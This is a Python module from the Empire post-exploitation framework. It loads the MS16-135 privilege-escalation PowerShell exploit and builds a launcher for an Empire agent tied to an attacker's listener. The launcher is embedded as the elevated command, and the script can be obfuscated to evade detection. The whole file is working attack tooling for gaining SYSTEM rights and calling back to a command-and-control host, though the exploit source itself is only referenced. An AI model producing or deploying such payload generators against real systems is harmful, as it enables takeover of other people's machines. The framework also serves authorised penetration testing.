from __future__ import print_function

from builtins import str
from builtins import object
from empire.server.common import helpers
from typing import Dict
import re
import base64

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        module_source = main_menu.installPath + "/data/module_source/privesc/Invoke-MS16135.ps1"
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""

        module_code = f.read()
        f.close()

        script = module_code

        # generate the launcher code without base64 encoding
        launcher = main_menu.stagers.stagers['multi/launcher']
        launcher.options['Listener'] = params['Listener']
        launcher.options['UserAgent'] = params['UserAgent']
        launcher.options['Proxy'] = params['Proxy']
        launcher.options['ProxyCreds'] = params['ProxyCreds']
        launcher.options['Base64'] = 'False'
        launcher_code = launcher.generate()

        # need to escape characters
        launcher_code = launcher_code.replace("`", "``").replace("$", "`$").replace("\"","'")
        
        script += 'Invoke-MS16135 -Command "' + launcher_code + '"'
        script += ';"`nInvoke-MS16135 completed."'

        if obfuscate:
            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
        script = helpers.keyword_obfuscation(script)

        return script

